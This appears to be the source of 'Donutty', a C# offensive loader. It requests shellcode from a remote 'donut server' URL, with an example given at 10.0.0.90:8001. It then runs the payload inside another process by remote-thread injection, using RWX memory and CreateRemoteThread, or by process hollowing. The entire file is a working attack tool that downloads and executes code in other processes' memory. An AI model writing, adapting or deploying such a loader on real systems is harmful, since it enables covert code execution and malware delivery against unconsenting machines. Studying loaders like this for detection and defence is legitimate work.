using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;
using System.IO;
using System.Net.Http;
using Newtonsoft.Json;

namespace Donutty
{

    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void help()
        {
            string help = @"
[-] Usage: Donutty.exe /m:mode /f:<filename> /p:""args here"" /a:<archnumber> /url:""http://url\"" /pid:<pid>
    
    Mandatory Keys
    /m => Specifies the injection type. 1 = Process Injection, 2 = Process Hollowing
    /f => Specifies the executable filename from the server to inject with
    /url => URL of donut server endpoint. Ex: /url:""http://10.0.0.90:8001/""

    /p => Specifies parameters or CLI args to pass. Ex: /p:""-c whoami""
    /a => Specifies architecture. 1 = x86, 2 = amd64 (default), 3 = x86+amd64
    /pid => PID of process to inject into. Necessary for Process Injection (/m:1)
    /b => Binary to hollow and inject into. Necessary for Process Hollowing (/m:2)
";
            Console.WriteLine(help);
        }

        static void inject(byte[] buf, int PID)
        {

            IntPtr output;
            IntPtr ProcessHandle = OpenProcess(0x001F0FFF, false, PID);
            IntPtr ProcessAddress = VirtualAllocEx(ProcessHandle, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            WriteProcessMemory(ProcessHandle, ProcessAddress, buf, buf.Length, out output);
            CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, ProcessAddress, IntPtr.Zero, 0, IntPtr.Zero);


        }
            static void hollow(string binary, byte[] shellcode)
        {

            ProcHollowing a = new ProcHollowing();
            ProcHollowing.PROCESS_INFORMATION pinf = ProcHollowing.StartProcess(binary);
            a.CreateSection((uint)shellcode.Length);
            a.FindEntry(pinf.hProcess);
            a.SetLocalSection((uint)shellcode.Length);
            a.CopyShellcode(shellcode);
            a.MapAndStart(pinf);
            ProcHollowing.CloseHandle(pinf.hThread);
            ProcHollowing.CloseHandle(pinf.hProcess);

        }
        static void Main(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0)
            {
                Console.WriteLine("[-] No arguments specified. Please refer the help section for more details.");
                help();
                return;
            }
            else if (arguments.ContainsKey("/help"))
            {
                help();
                return;
            }
            else if (!arguments.ContainsKey("/m"))
            {
                Console.WriteLine("[-] Need to specify an injection type!");
            }
            else if (!arguments.ContainsKey("/f"))
            {
                Console.WriteLine("[-] Need to specify a file to inject with!");
            }
            else if (!arguments.ContainsKey("/url"))
            {
                Console.WriteLine("[-] Need to specify the donut server url!");
            }
            else if (arguments.ContainsKey("/m") && arguments["/m"] == "1" && (!arguments.ContainsKey("/pid")))
            {
                Console.WriteLine("[-] Need to specify a PID to inject to for Process Injection!");
            }
            else if (arguments.ContainsKey("/m") && arguments["/m"] == "2" && (!arguments.ContainsKey("/b")))
            {
                Console.WriteLine("[-] Need to specify a path to the binary to inject to for Process Hollowing!");
            }
            string fileName = arguments["/f"];
            string mode = arguments["/m"];
            string url = arguments["/url"];
            string parameters;
            string architecture;
            int PID;
            string binary;
            try
            {
                parameters = arguments["/p"];
            }
            catch
            {
                parameters = "";
            }
            
            try
            {
                architecture = arguments["/a"];
            }
            catch
            {
                architecture = "2";
            }

            try
            {
                PID = Int32.Parse(arguments["/pid"]); ;
            }
            catch
            {
                PID = 0;
            }

            try
            {
                binary = arguments["/b"];
            }
            catch
            {
                binary = "";
            }
            #region Web request

            WebClient wc = new WebClient();
            
            object tmp = new
            {
                file = fileName,
                arch = architecture,
                args = parameters,
            };
            string json = JsonConvert.SerializeObject(tmp);
            
            
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";
            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                streamWriter.Write(json);
            }
            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }
            #endregion

            byte[] memBuf = wc.DownloadData(url);
            byte[] buf = memBuf;
            if (mode.Equals("1"))
            {
                inject(buf, PID);
            }
            else if (mode.Equals("2"))
            {
                hollow(binary, buf);
            }

            
        }
    }
}
